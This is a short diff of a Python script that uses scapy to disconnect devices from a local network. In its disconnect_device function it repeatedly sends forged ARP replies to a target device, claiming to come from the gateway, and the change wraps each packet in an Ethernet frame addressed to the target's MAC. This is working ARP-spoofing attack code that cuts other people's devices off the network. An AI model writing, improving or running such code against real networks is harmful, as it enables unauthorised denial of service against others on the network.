@@ -49,7 +49,8 @@ def disconnect_device(ip, mac):
     DISCONNECTED_DEVICES.add(ip)
     def loop():
         while ip in DISCONNECTED_DEVICES:
-            packet = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP)
+            ether = Ether(dst=mac)
+            packet = ether / ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP)
             send(packet, verbose=0)
             time.sleep(2)
     from threading import Thread
@@ -165,3 +166,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
